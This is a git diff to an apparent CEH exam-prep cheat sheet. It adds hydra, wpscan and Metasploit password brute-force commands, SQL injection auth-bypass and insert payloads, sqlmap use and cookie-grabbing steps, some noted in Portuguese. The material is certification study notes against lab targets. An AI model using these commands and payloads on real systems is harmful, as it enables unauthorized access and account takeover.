@@ -45,6 +45,18 @@ Then go to Desktop and in Ceh tools folder you will find wordlists, here you wil
 Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
+
+wpscan --url http://wpscan.thm/ --enumerate t,p,u
+wpscan --url http://seila.playground --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+
+msfconsole
+use auxiliary/scanner/wordpress_login_enum
+options
+set PASS_FILE /usr/wordlist.txt
+set RHOST 192.168.44.44
+set RPORT 8080
+set TARGETURI http://ddddddg
+set USERNAME adminrun
 ```
 #  Hacking Web Application
 ```
@@ -71,6 +83,12 @@ Now you can do a RDP connection with the given ip and the Test account which you
 #  SQL Injections
 ```
 1- Auth Bypass-  hi'OR 1=1 --
+blah' or 1=1 --
+(se a requisicao for um post, tem que pegar a req no "Buster"(esqueci o nome) e gravar num arquivo e fazer
+sqlmap -r req.txt ....
+hook www.movies.com/viewprofile.apsx?id=1
+f12 no browser Storage e pegar o cookie
+na aba Console digitar document.cookie
 2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
 3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
 Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
